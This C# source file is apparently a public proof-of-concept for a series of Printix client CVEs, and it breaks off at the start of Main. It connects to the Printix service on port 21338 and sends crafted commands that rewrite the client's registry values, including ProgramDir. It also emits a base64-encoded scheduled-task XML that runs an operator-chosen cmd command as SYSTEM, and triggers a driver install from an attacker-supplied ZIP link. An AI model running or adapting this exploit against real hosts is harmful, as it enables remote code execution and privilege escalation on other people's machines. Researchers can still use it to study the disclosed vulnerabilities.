using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Converters;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/**
 * ________________________________________
 * 
 * Printix Vulnerability, Public CVE Release
 * Part of a Printix Vulnerability series
 * Author: Logan Latvala
 * Github: https://github.com/ComparedArray/
 * 
 * https://github.com/ComparedArray/printix-CVE-2022-29551
 * https://github.com/ComparedArray/printix-CVE-2022-29552
 * https://github.com/ComparedArray/printix-CVE-2022-29553
 * https://github.com/ComparedArray/printix-CVE-2022-29554
 * https://github.com/ComparedArray/printix-CVE-2022-30006
 * ________________________________________
 * 
 */


namespace ConsoleApp1a
{
    /// <summary>
    /// The UITasks is for choosing a command number to push to PrintixService or PrintixClient. 
    /// </summary>
    public enum UItasks
    {
        Init = 117,
        GetTenantIdReq = 118,
        GetTenantIdRsp = 119,
        GetConfigurationReq = 120,
        GetConfigurationRsp = 121,
        GetCaptionsInfoReq = 122,
        GetCaptionsInfoRsp = 123,
        GetQueuesReq = 124, //Check Here -- Obtain printer information from queues.
        GetQueuesRsp = 125,
        ConfigurationChanged = 126,
        QueuesChanged = 127,
        GetInstalledQueuesReq = 128,
        GetInstalledQueuesRsp = 129,
        SetAdsInformationInd = 130,
        Continue = 131,
        LoginReq = 132,
        LoginHubReq = 133,
        LoginReqTimeout = 134,
        LoginContinue = 135,
        GetUserSettingsReq = 136,
        GetuserSettingsRsp = 137,
        SetUserSettings = 138,
        SetUserSettingsInd = 139,
        StartInstall = 140,
        StartInstallQueue = 141,
        DoneInstall = 142,
        StatusReq = 143,
        StatusRsp = 144,
        NewPrintjobNotification = 145,
        AskForPrintMethod = 146,
        AskForPrintMethodDone = 147,
        denyPrintjobNotification = 148,
        SwapLogFiles = 149,
        Quit = 150,
        BeginInstall = 151,
        InstallProgress = 152,
        InstallCancel = 153,
        InstallDone = 154,
        ClientConnected = 155,
        ClientDisConnected = 156,
        UninstallPrintix = 157,
        driverConfigurationProgress = 158,
        driverConfigurationDone = 159,
        setDefaultQueue = 160,
        setClientState = 161,
        GetSharesReq = 162,
        GetSharesRsp = 163,
        DeleteShare = 164,
        PersistentRegistryData = 165,
        JobListReq = 166,
        JobListRsp = 167,
        openContextDlg = 168,
        StartNewVersion = 11111
    }
    public class CompCommClient
    {
        private bool connected;

        private TcpClient client;

        private SslStream networkStream;

        private string serverName = string.Empty;

        private int serverPort;

        public bool Connected()
        {
            return connected;
        }

        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            switch (sslPolicyErrors)
            {
                case SslPolicyErrors.None:
                    Console.WriteLine("Client: Certificate OK");
                    return true;
                case SslPolicyErrors.RemoteCertificateChainErrors:
                    Console.WriteLine("Client: Certificate OK (Chain)");
                    return true;
                default:
                    Console.WriteLine("Client: Certificate error: {0}", sslPolicyErrors);
                    return false;
            }
        }

        public bool Connect(string server, int port, int retry, int timeout)
        {
            int num = 0;
            Console.WriteLine("CompCommClient[{0}:{1}]: Client connect", server, port);
            while (true)
            {
                connected = false;
                try
                {
                    client = new TcpClient(server, port);
                }
                catch (SocketException ex)
                {
                    Console.WriteLine("CompCommClient[{0}:{1}]: Connection error, CC = {2}. Retry = {3}", server, port, ex.ErrorCode, num++);
                    goto IL_00be;
                }
                catch (Exception ex2)
                {
                    Console.WriteLine("CompCommClient[{0}:{1}]: Connection Exception. Retry = {2}", server, port, num++);
                    Console.WriteLine("CompCommClient: Exception:", ex2);
                    goto IL_00be;
                }
                break;
            IL_00be:
                if (num >= retry)
                {
                    return false;
                }
                Thread.Sleep(timeout);
            }
            SslStream sslStream = new SslStream(client.GetStream(), leaveInnerStreamOpen: false, ValidateServerCertificate, null);
            if (sslStream == null || !client.Connected)
            {
                Console.WriteLine("CompCommClient[{0}:{1}]: ssl Stream error", server, port);
                return false;
            }
            try
            {
                sslStream.ReadTimeout = 5000;
                sslStream.WriteTimeout = 5000;
                sslStream.AuthenticateAsClient(CompCommHeader.subject, null, SslProtocols.Tls | SslProtocols.Tls11 | SslProtocols.Tls12, checkCertificateRevocation: true);
            }
            catch (Exception ex3)
            {
                Console.WriteLine("CompCommClient[{0}:{1}]: Exception: {2}", server, port, ex3.Message);
                if (ex3.InnerException != null)
                {
                    Console.WriteLine("Inner exception: {0}", ex3.InnerException.Message);
                }
                Console.WriteLine("Authentication failed - closing the connection.");
                sslStream.Close();
                client.Close();
                client = null;
                return false;
            }
            networkStream = sslStream;
            sslStream.ReadTimeout = -1;
            sslStream.WriteTimeout = 300000;
            int num2 = 0;
            Process currentProcess = Process.GetCurrentProcess();
            num2 = currentProcess.SessionId;
            if (currentProcess.SessionId == 0)
            {
                num2 = Win32Utils.WTSGetActiveConsoleSessionId();
            }
            Console.WriteLine("CompCommClient[{0}:{1}]: Client connected, username: {2}, sess: {3}", server, port, DefaultValues.CurrentSessName, num2);
            string s = JsonConvert.SerializeObject(num2) + ":" + port;
            byte[] bytes = Encoding.UTF8.GetBytes(DefaultValues.CurrentSessName);
            SendInternalMessage(1, bytes);
            bytes = Encoding.UTF8.GetBytes(s);
            SendInternalMessage(2, bytes);
            string s2 = string.Empty;
            try
            {
                s2 = "PrintixClientConnection";
            }
            catch (Exception ex4)
            {
                Console.WriteLine("CompCommClient[{0}:{1}]: Client connect, Exception (SID): {2}", server, port, ex4.Message);
            }
            bytes = Encoding.UTF8.GetBytes(s2);
            SendInternalMessage(4, bytes);
            serverName = server;
            serverPort = port;
            connected = true;
            return true;
        }

        public void disConnect()
        {
            if (networkStream != null)
            {
                networkStream.Close();
            }
            if (client != null)
            {
                client.Close();
            }
            networkStream = null;
            client = null;
            connected = false;
            Console.WriteLine("CompCommClient[{0}:{1}]: Client disConnected, username: {2}", serverName, serverPort, DefaultValues.CurrentSessName);
        }

        private int bufferRead(SslStream stream, byte[] buffer, int size)
        {
            int i;
            int num;
            for (i = 0; i < size; i += num)
            {
                num = stream.Read(buffer, i, size - i);
                if (num == 0)
                {
                    return 0;
                }
            }
            return i;
        }

        public bool Read(out int cmd, out byte[] data)
        {
            byte[] array = new byte[20];
            int num = 0;
            int num2 = 0;
            cmd = 0;
            data = null;
            try
            {
                if (bufferRead(networkStream, array, 4) == 0)
                {
                    throw new Exception();
                }
                int num3 = BitConverter.ToInt32(array, 0);
                if (bufferRead(networkStream, array, 4) == 0)
                {
                    throw new Exception();
                }
                CompCommHeader.CompCommCommand compCommCommand = (CompCommHeader.CompCommCommand)BitConverter.ToInt32(array, 0);
                num3 -= 4;
                switch (compCommCommand)
                {
                    case CompCommHeader.CompCommCommand.UserData:
                        if (bufferRead(networkStream, array, 4) == 0)
                        {
                            throw new Exception();
                        }
                        cmd = BitConverter.ToInt32(array, 0);
                        num3 -= 4;
                        if ((num2 = num3) > 0)
                        {
                            array = new byte[num2];
                            if (bufferRead(networkStream, array, num2) == 0)
                            {
                                throw new Exception();
                            }
                            data = array;
                        }
                        else
                        {
                            data = null;
                            num = 0;
                        }
                        break;
                    case CompCommHeader.CompCommCommand.UserSettings:
                    case CompCommHeader.CompCommCommand.UserSID:
                    case CompCommHeader.CompCommCommand.KeepAlive:
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("CompCommClient[{0}:{1}]: Read Exception ", serverName, serverPort);
                Console.WriteLine("CompCommClient: Read Exception ", ex);
                networkStream.Close();
                client.Close();
                networkStream = null;
                client = null;
                connected = false;
                return false;
            }
            return true;
        }

        public bool SendMessage(int cmd, byte[] data)
        {
            bool result = true;
            int value = 8 + ((data != null) ? data.Length : 0);
            try
            {
                networkStream.Write(BitConverter.GetBytes(value), 0, 4);
                networkStream.Write(BitConverter.GetBytes(6), 0, 4);
                networkStream.Write(BitConverter.GetBytes(cmd), 0, 4);
                if (data != null)
                {
                    networkStream.Write(data, 0, data.Length);
                }
                networkStream.Flush();
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine("CompCommClient: Send Expection ", ex);
                connected = false;
                networkStream.Close();
                client.Close();
                networkStream = null;
                client = null;
                return false;
            }
        }

        private bool SendInternalMessage(int cmd, byte[] data)
        {
            bool result = true;
            int num = 4 + ((data != null) ? data.Length : 0);
            try
            {
                Console.WriteLine("CompCommClient[{0}:{1}]: Sending Internal cmd {2}, data = {3} ", serverName, serverPort, cmd, num);
                networkStream.Write(BitConverter.GetBytes(num), 0, 4);
                networkStream.Write(BitConverter.GetBytes(cmd), 0, 4);
                if (data != null)
                {
                    networkStream.Write(data, 0, data.Length);
                }
                networkStream.Flush();
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine("CompCommClient: Send Internal Expection ", ex);
                connected = false;
                networkStream.Close();
                client.Close();
                networkStream = null;
                client = null;
                return false;
            }
        }
    }

    public class PersistentRegistryData
    {
        public PersistentRegistryCmds cmd;

        public string path;

        public int VDIType;

        public byte[] registryData;
    }

    [JsonConverter(typeof(StringEnumConverter))]
    public enum PersistentRegistryCmds
    {
        StoreData = 1,
        DeleteSubTree,
        RestoreData
    }
    /// <summary>
    /// The session declaration class.
    /// </summary>
    public class Session
    {
        /// <summary>
        /// The global command for UITasks.
        /// </summary>
        public int commandNumber { get; set; }
        /// <summary>
        /// The IP, Hostname or the NETBIOS of the machine to connect to.
        /// </summary>
        public string host { get; set; }
        /// <summary>
        /// The string data to be converted, which is dependent on the sesison name.
        /// </summary>
        public string data { get; set; }
        /// <summary>
        /// The session name does not matter, yet it is recommended to make it a random, non-identifying name.
        /// </summary>
        public string sessionName { get; set; }
        public Session(int commandSessionNumber = 0)
        {
            commandNumber = commandSessionNumber;
            switch (commandSessionNumber)
            {
                //Incase it's initiated, kill it immediately.
                case (0):
                    Environment.Exit(0x001);
                    break;
                case (1672):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData1672 = new PersistentRegistryData();
                    persistentRegistryData1672.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData1672.VDIType = 12; //(int)DefaultValues.VDIType;
                                                             //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";

                    persistentRegistryData1672.path = "" + "printix\\SOFTWARE\\printix.net\\Printix Client\\CurrentVersion\\ProgramDir";
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData1672.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);


                    int dataF12 = 1;
                    Console.WriteLine("Set Data type to: " + dataF12);


                    Console.WriteLine("What path to a folder on the remote computer contains unis000.exe?");
                    string dataB12 = Console.ReadLine();
                    Console.WriteLine("Set ProgramDir to: " + dataF12);

                    byte[] loader12 = CVESUBMISSION.selectDataType(dataB12, RegistryValueKind.String);
                    List<byte> byteContainer12 = new List<byte>();
                    byteContainer12.Add(1);

                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCTION selectDataType()!)




                    int pathHolder12 = 0;
                    foreach (byte bit12 in loader12)
                    {
                        pathHolder12++;
                        byteContainer12.Add(bit12);
                    }

                    persistentRegistryData1672.registryData = byteContainer12.ToArray();




                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData1672));
                    data = JsonConvert.SerializeObject(persistentRegistryData1672);
                    break;
                case (1671):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData1671 = new PersistentRegistryData();
                    persistentRegistryData1671.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData1671.VDIType = 12; //(int)DefaultValues.VDIType;
                                                             //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";

                    persistentRegistryData1671.path = "" + "printix\\SOFTWARE\\printix.net\\Printix Client\\CurrentVersion\\ProgramDir";
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData1671.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);


                    int dataF1 = 1;
                    Console.WriteLine("Set Data type to: " + dataF1);


                    Console.WriteLine("What path to a folder on the remote computer contains PrintixServiceTask.xml?");
                    string dataB1 = Console.ReadLine();
                    Console.WriteLine("Set ProgramDir to: " + dataF1);

                    string ConsoleBase64 = Encoding.UTF8.GetString(Convert.FromBase64String("PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2Ij8+CjxUYXNrIHZlcnNpb249IjEuMyIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA0LzAyL21pdC90YXNrIj4KICA8UmVnaXN0" +
                       "cmF0aW9uSW5mbz4KICAgIDxEYXRlPjIwMTctMDktMjFUMTM6NDM6MDE8L0RhdGU+CiAgICA8QXV0aG9yPlByaW50aXg8L0F1dGhvcj4KICAgIDxVUkk+XFByaW50aXggU2VydmljZTwvVVJJPgogIDwvUmVnaXN0cmF0aW9uSW5mbz4KICA8VHJpZ2dlcnM+" +
                       "CiAgICA8RXZlbnRUcmlnZ2VyPgogICAgICA8RW5hYmxlZD50cnVlPC9FbmFibGVkPgogICAgICA8U3Vic2NyaXB0aW9uPiZsdDtRdWVyeUxpc3QmZ3Q7Jmx0O1F1ZXJ5IElkPSIwIiBQYXRoPSJBcHBsaWNhdGlvbiImZ3Q7Jmx0O1NlbGVjdCBQ" +
                       "YXRoPSJBcHBsaWNhdGlvbiImZ3Q7KltTeXN0ZW1bUHJvdmlkZXJbQE5hbWU9J1ByaW50aXhDbGllbnQnXSBhbmQgRXZlbnRJRD0yNDldXSZsdDsvU2VsZWN0Jmd0OyZsdDsvUXVlcnkmZ3Q7Jmx0Oy9RdWVyeUxpc3QmZ3Q7PC9TdWJzY3JpcHRpb24+CiAgICA8L0V2ZW50VHJpZ" +
                       "2dlcj4KICA8L1RyaWdnZXJzPgogIDxQcmluY2lwYWxzPgogICAgPFByaW5jaXBhbCBpZD0iQXV0aG9yIj4KICAgICAgPFVzZXJJZD5TLTEtNS0xODwvVXNlcklkPgogICAgICA8UnVuTGV2ZWw+TGVhc3RQcml2aWxlZ2U8L1J1bkxldmVsPgogICAgPC9QcmluY2lwYWw+CiAgPC9QcmluY2lwY" +
                       "WxzPgogIDxTZXR0aW5ncz4KICAgIDxNdWx0aXBsZUluc3RhbmNlc1BvbGljeT5JZ25vcmVOZXc8L011bHRpcGxlSW5zdGFuY2VzUG9saWN5PgogICAgPERpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPmZhbHNlPC9EaXNhbGxvd1N0YXJ0SWZPbkJhdHRlcmllcz4KICAgIDxTdG9wSWZHb2luZ09uQmF0d" +
                       "GVyaWVzPnRydWU8L1N0b3BJZkdvaW5nT25CYXR0ZXJpZXM+CiAgICA8QWxsb3dIYXJkVGVybWluYXRlPnRydWU8L0FsbG93SGFyZFRlcm1pbmF0ZT4KICAgIDxTdGFydFdoZW5BdmFpbGFibGU+ZmFsc2U8L1N0YXJ0V2hlbkF2YWlsYWJsZT4KICAgIDxSdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlPmZhbHNlPC9" +
                       "SdW5Pbmx5SWZOZXR3b3JrQXZhaWxhYmxlPgogICAgPElkbGVTZXR0aW5ncz4KICAgICAgPFN0b3BPbklkbGVFbmQ+dHJ1ZTwvU3RvcE9uSWRsZUVuZD4KICAgICAgPFJlc3RhcnRPbklkbGU+ZmFsc2U8L1Jlc3RhcnRPbklkbGU+CiAgICA8L0lkbGVTZXR0aW5ncz4KICAgIDxBbGxvd1N0YXJ0T25EZW1hbmQ+dHJ1ZTwv" +
                       "QWxsb3dTdGFydE9uRGVtYW5kPgogICAgPEVuYWJsZWQ+dHJ1ZTwvRW5hYmxlZD4K" +
                       "ICAgIDxIaWRkZW4+ZmFsc2U8L0hpZGRlbj4KICAgIDxSdW5Pbmx5SWZJZGxlPmZhbHNlPC9SdW5Pbmx5SWZJZGxlPgogICAgPERpc2FsbG93U3RhcnRPblJlbW90ZUFwcFNlc3Npb24+ZmFsc2U8L0Rpc2FsbG93U3RhcnRPblJlbW90ZUFw" +
                       "cFNlc3Npb24+CiAgICA8VXNlVW5pZmllZFNjaGVkdWxpbmdFbmdpbmU+dHJ1ZTwvVXNlVW5pZmllZFNjaGVkdWxpbmdFbmdpbmU+CiAgICA8" +
                       "V2FrZVRvUnVuPmZhbHNlPC9XYWtlVG9SdW4+CiAgICA8RXhlY3V0aW9uVGltZUxpbWl0PlBUMUg8L0V4ZWN1dGlvblRpbWVMaW1pdD4KICAgIDxQcmlvcml0eT43PC9Qcmlvcml0eT4KICA8L1NldHRpbmdzPgogIDxBY3Rpb25zIENvbnRleHQ9IkF1dGhvci" +
                       "I+CiAgICA8RXhlYz4KICAgICAgPENvbW1hbmQ+Y21kPC9Db21tYW5kPgogICAgICA8QXJndW1lbnRzPkNNREFSR1VNRU5UU0hFUkU8L0FyZ3VtZW50cz4KICAgIDwvRXhlYz4KICA8L0FjdGlvbnM+CjwvVGFzaz4="));

                    Console.WriteLine("What console command do you want to execute? ");
                    string ConsoleCommand = Console.ReadLine();
                    Console.WriteLine("\n On the remote computer, create a file named PrintixServiceTask.xml with the following contents:");
                    Console.WriteLine(ConsoleBase64.Replace("CMDARGUMENTSHERE", ConsoleCommand));
                    Console.WriteLine("\nDo not copy this line or any below.");


                    byte[] loader1 = CVESUBMISSION.selectDataType(dataB1, RegistryValueKind.String);
                    List<byte> byteContainer1 = new List<byte>();
                    byteContainer1.Add(1);

                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCTION selectDataType()!)




                    int pathHolder1 = 0;
                    foreach (byte bit1 in loader1)
                    {
                        pathHolder1++;
                        byteContainer1.Add(bit1);
                    }

                    persistentRegistryData1671.registryData = byteContainer1.ToArray();




                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData1671));
                    data = JsonConvert.SerializeObject(persistentRegistryData1671);
                    break;
                case (151):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    Console.WriteLine("\n What is your ZIP download link containing the driver? \n");
                    Console.Write(" .ZIP Link: ");
                    string SelectedDownloadLink = Console.ReadLine();
                    Console.WriteLine("Download Link set to: " + SelectedDownloadLink);

                    Console.WriteLine("\n What is the .INI filename?  \n");
                    Console.Write(".INI Filename (ends in .ini): ");
                    string SelectedINFNameFile = Console.ReadLine();
                    Console.WriteLine("INI Filename set to:  " + SelectedINFNameFile);

                    //This is encoded in simple base64 for formatting, whilst converting to a proper format without newtonsoft.
                    string CodedPrinterRequest = Encoding.UTF8.GetString(Convert.FromBase64String("W3sic2VydmVyTmF" +
                                "tZSI6bnVsbCwicG9ydE5hbWUiOm51bGwsInNpZ2" +
                                "5JZCI6IkFNQyIsIm5ldHdvcmtJRCI6InRoaXN3Y" +
                                "XNhbmV0d29ya2lkIiwibW9kZWwiOiJNb2NrVHJpYWwiLCJ" +
                                "sb2NhdGlvbiI6IkFueXdoZXJlIiwidHlwZSI6Ik5FVFdPUksiL" +
                                 "CJpcEFkZHJlc3MiOm51bGwsInJlc0lkIjoiY3Vub29j" +
                                 "YW5vbyIsIm5hbWUiOiJQcmFjdGljYWxwcmludGluZyIsImFjdGl2ZSI6dHJ1ZSwiZGVm" +
                                 "YXVsdE1vbm8iOmZhbHNlLCJkZWZhdWx0RHVwbGV4" +
                                 "IjpmYWxzZSwiZHJpdmVySW5mbyI6eyJJRCI6Imh0dHBzOi8vYXBp" +
                                 "LnByaW50aXgubmV0L3YxLyIsIm5hbWUiOiJIUCBVbml2ZXJz" +
                                 "YWwgUHJpbnRpbmcgUENMIDYiLCJvcGVyYXRpbmdT" +
                                 "eXN0ZW0iOiJXSU5fMTBfNjQiLCJtYW51ZmFjdHVyZXIiOi" +
                                 "JKSiBBYnJhbXMiLCJkb3dubG9hZFVybCI6IkNP" +
                                 "TVBSRVNTRURaSVBET1dOTE9BRExJTksiLCJ" +
                                 "kcml2ZXJwYXRoIjoiSU5GU0VMRUNURUROQU1FIiwibWFjSW5zdGF" +
                                 "sbGVyTWFudWZhY3R1cmVyIjoiIiwibWFjSW5zdGFsbGVyTW" +
                                 "9kZWwiOiIiLCJ2ZXJzaW9uIjoiNjEuMjI1LjEuMjM5ODkiLCJzdXBwb3J0ZWRMYW5ndWFnZSI6ImVuIiwiYWxsb3dBdXRvQ29uZmlndXJhdGlvbiI6dHJ1ZSwiY29uZmlnIjp7Im5hbWUiOiJTb21lUGVudGVzdERyaXZlciIsInZl" +
                                 "cnNpb24iOiIwIiwiZHJpdmVyQ29uZmlnVXJ" +
                                 "sIjoidGhpc3dhc2FwcmludGFwaSIsImNvb" +
                                 "mZpZ3VyYXRpb24iOm51bGx9fSwiZGV2aWNlVVJJIjpudWxsLCJzdGF0dXMiOiJO" +
                                 "T1RfSU5TVEFMTEVEIiwic2VsZWN0ZWQiOn" +
                                 "RydWUsImRpc2NhcmQiOmZhbHNlLCJhdH" +
                                 "RyIjowLCJjdXBzUHJvcGVydGllcyI6bnVsbCwic" +
                                 "HBkIjpudWxsLCJpc1ByaW50aXhRdWV1ZSI6ZmFsc2V9XQ=="));
                    data = CodedPrinterRequest.Replace("COMPRESSEDZIPDOWNLOADLINK", SelectedDownloadLink).Replace("INFSELECTEDNAME", SelectedINFNameFile);
                    break;
                case (120):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "enumData";

                    break;
                case (124):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "enumData";

                    break;
                //Incase the Ping request is sent though, get its needed data.
                case (118):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    data = "pingData";
                    sessionName = "PingerRinger";
                    break;

                //Incase the RegEdit request is sent though, get its needed data.
                case (165):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    PersistentRegistryData persistentRegistryData = new PersistentRegistryData();
                    persistentRegistryData.cmd = PersistentRegistryCmds.RestoreData;
                    persistentRegistryData.VDIType = 12; //(int)DefaultValues.VDIType;
                                                         //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";
                    Console.WriteLine("\n What Node starting from \\\\Printix\\ would you like to select? \n");
                    Console.WriteLine("Append a new node/element by adding \\ to the end of of an element.");
                    Console.WriteLine("Example: HKEY_LOCAL_MACHINE\\SOFTWARE\\printix.net\\Printix Client\\CurrentVersion \n");
                    Console.Write("HKEY_LOCAL_MACHINE\\SOFTWARE\\printix.net\\Printix Client\\");
                    persistentRegistryData.path = "" + "printix\\SOFTWARE\\printix.net\\Printix Client\\" + Console.ReadLine();
                    Console.WriteLine("Full Address Set To:  " + persistentRegistryData.path);

                    //persistentRegistryData.registryData = new byte[2];
                    //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);

                    Console.WriteLine("\n What Data type are you using? \n1. String 2. Dword  3. Qword 4. Multi String  \n");
                    Console.Write("Type:  ");
                    int dataF = int.Parse(Console.ReadLine());
                    Console.WriteLine("Set Data to: " + dataF);


                    Console.WriteLine("\n What value is your type?  \n");
                    Console.Write("Value:  ");
                    string dataB = Console.ReadLine();
                    Console.WriteLine("Set Data to: " + dataF);

                    byte[] loader = null;
                    List<byte> byteContainer = new List<byte>();

                    //Dword = 4
                    //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCITON selectDataType()!)

                    switch (dataF)
                    {
                        case (1):

                            loader = CVESUBMISSION.selectDataType(dataB, RegistryValueKind.String);
                            byteContainer.Add(1);
                            break;
                        case (2):
                            loader = CVESUBMISSION.selectDataType(int.Parse(dataB), RegistryValueKind.DWord);
                            byteContainer.Add(4);
                            break;
                        case (3):
                            loader = CVESUBMISSION.selectDataType(long.Parse(dataB), RegistryValueKind.QWord);
                            byteContainer.Add(11);
                            break;
                        case (4):
                            loader = CVESUBMISSION.selectDataType(dataB.Split('%'), RegistryValueKind.MultiString);
                            byteContainer.Add(7);
                            break;

                    }

                    int pathHolder = 0;
                    foreach (byte bit in loader)
                    {
                        pathHolder++;
                        byteContainer.Add(bit);
                    }

                    persistentRegistryData.registryData = byteContainer.ToArray();
                    //added stuff:

                    //PersistentRegistryData data = new PersistentRegistryData();
                    //data.cmd = PersistentRegistryCmds.RestoreData;
                    //data.path = "";


                    //data.cmd 
                    Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData));
                    data = JsonConvert.SerializeObject(persistentRegistryData);

                    break;
                //Custom cases, such as custom JSON Inputs and more.
                case (100):
                    Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                    Console.Write("IP: ");
                    host = Console.ReadLine();
                    Console.WriteLine("Host address set to: " + host);

                    Console.WriteLine("\n What Data Should Be Sent?\n");
                    Console.Write("Data: ");
                    data = Console.ReadLine();
                    Console.WriteLine("Data set to: " + data);

                    Console.WriteLine("\n What Session Name Should Be Used? \n");
                    Console.Write("Session Name: ");
                    sessionName = Console.ReadLine();
                    Console.WriteLine("Session name set to: " + sessionName);
                    break;
            }


        }
        /// <summary>
        /// The PersistentRegistryData Header, for publishing in the registry.
        /// </summary>
        public class PersistentRegistryData
        {
            public PersistentRegistryCmds cmd;

            public string path;

            public int VDIType;

            public byte[] registryData;
        }
        /// <summary>
        /// The PersistentRegistryCmds class is designated for general data selection.
        /// </summary>
        [JsonConverter(typeof(StringEnumConverter))]
        public enum PersistentRegistryCmds
        {
            StoreData = 1,
            DeleteSubTree,
            RestoreData
        }
    }

    /// <summary>
    /// The CVE Release class, designed for easy application changes.
    /// </summary>
    class CVESUBMISSION
    {
        /// <summary>
        /// Selects the datatype for a registry entry.
        /// </summary>
        /// <param name="value">The value to format.</param>
        /// <param name="format">The kind of value, such as DWORD,String,Binary,Ect.</param>
        /// <returns>A </returns>
        public static byte[] selectDataType(object value, RegistryValueKind format)
        {
            byte[] array = new byte[50];

            switch (format)
            {
                case RegistryValueKind.String: //1
                    array = Encoding.UTF8.GetBytes((string)value);
                    break;
                case RegistryValueKind.DWord://4
                    array = ((!(value.GetType() == typeof(int))) ? BitConverter.GetBytes((long)value) : BitConverter.GetBytes((int)value));
                    break;
                case RegistryValueKind.QWord://11
                    if (value == null)
                    {
                        value = 0L;
                    }
                    array = BitConverter.GetBytes((long)value);
                    break;
                case RegistryValueKind.MultiString://7 
                    {
                        if (value == null)
                        {
                            value = new string[1] { string.Empty };
                        }
                        string[] array2 = (string[])value;
                        foreach (string s in array2)
                        {
                            byte[] bytes = Encoding.UTF8.GetBytes(s);
                            byte[] second = new byte[1] { (byte)bytes.Length };
                            array = array.Concat(second).Concat(bytes).ToArray();
                        }
                        break;
                    }
            }
            return array;
        }

        /// <summary>
        /// Starts a client session and returns the message, much more optimized than the other setup.
        /// </summary>
        /// <param name="host">The host you want to initiate the TCP session with. (Accepts IP Or Host Name)</param>
        /// <param name="cmd">The command syntax to use, in which is defined in the UITasks class.</param>
        /// <param name="data">The data that you want to send to the client.</param>
        /// <param name="waitInSeconds">The amount of delay for a session in seconds.</param>
        /// <param name="retries">The amount of times to retry a request.</param>
        /// <param name="timeout">The amount of time a client can be disconnected for. Must be less than or equal to 10,000.</param>
        /// <returns>The response returned from the connection session. Returns NULL if it is unable to receive a message.</returns>
        public static string startClientSession(string host, UItasks cmd, string data, bool waitForResponse = true, double waitInSeconds = 4.0, int retries = 3, int timeout = 10000)
        {
            CompCommClient client = new CompCommClient();

            client.Connect(host, 21338, retries, timeout);
            try
            {

                if (waitForResponse)
                {
                    int counter = 0;
                    while (counter < retries && client.Connected())
                    {
                        counter++;
                        client.SendMessage((int)cmd, Encoding.UTF8.GetBytes(data));

                        //Converts it to milliseconds, you can manually define it by removing the constant.

                        Thread.Sleep((int)waitInSeconds * 1000);
                        client.Read(out var cmdr, out var datar);
                        Console.WriteLine("Retry: #" + counter + " |  cmd: #" + cmdr + " | data: " + ((datar?.Any() == true) ? Encoding.UTF8.GetString(datar) : "Retry: #" + counter + "No Data Was Received! [err]"));
                        //client.disConnect();
                        if ((datar?.Any() == true))
                        {
                            client.disConnect();
                            return ((datar?.Any() == true) ? Encoding.UTF8.GetString(datar) : null);

                        }

                    }
                }
                else
                {
                    if (client.Connected())
                    {
                        client.SendMessage((int)cmd, Encoding.UTF8.GetBytes(data));
                        Thread.Sleep(1000);
                        client.disConnect();
                        return "No response is required.";
                    }

                }
                Thread.Sleep(1000);
                client.disConnect();
                return "[Timeout Exception, either increase your retries or you may be patched out...][err]";

            }
            catch (Exception e)
            {
                Debug.WriteLine("A Client Connection Failed! Message =  " + e);
                return null;
            }
        }
        static void Main(string[] args)
        {

